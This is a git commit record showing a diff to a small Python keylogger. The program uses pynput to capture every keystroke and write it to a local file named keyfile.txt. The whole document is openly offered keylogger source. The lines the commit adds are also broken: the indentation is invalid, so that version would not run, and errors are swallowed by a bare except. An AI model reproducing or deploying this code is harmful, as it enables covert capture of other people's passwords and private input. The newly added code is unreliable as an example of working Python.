92f9d81b5a0a1eba076ebf68396c1eac5706ff16
NIKHIL SALUNKHE <106921014+PhantomMenace404@users.noreply.github.com>
2024-06-10 15:05:44 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,21 +1,17 @@
 from pynput import keyboard
 
-# Function to handle key press events
 def keyPressed(key):
-    print(str(key))  # Print the key for debugging purposes
 
-    # Open the log file in append mode
-    with open("keyfile.txt", 'a') as logkey:
+print(str(key))
+
+     with open("keyfile.txt",'a') as logkey:
         try:
-            char = key.char  # Get the character representation of the key
-            logkey.write(char)  # Write the character to the log file
-        except AttributeError:
-            # Handle special keys (e.g., shift, ctrl) by logging their names
-            logkey.write(f'[{str(key)}]')
+            char = key.char
+            logkey.write(char)
+        except:
+            print("error getting char")
 
-# Main function to start the keylogger
-if __name__ == '__main__':
-    # Set up the listener
+if __name__=='__main__':
     listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()  # Start the listener
-    input()  # Keep the program running
+    listener.start()
+    input()
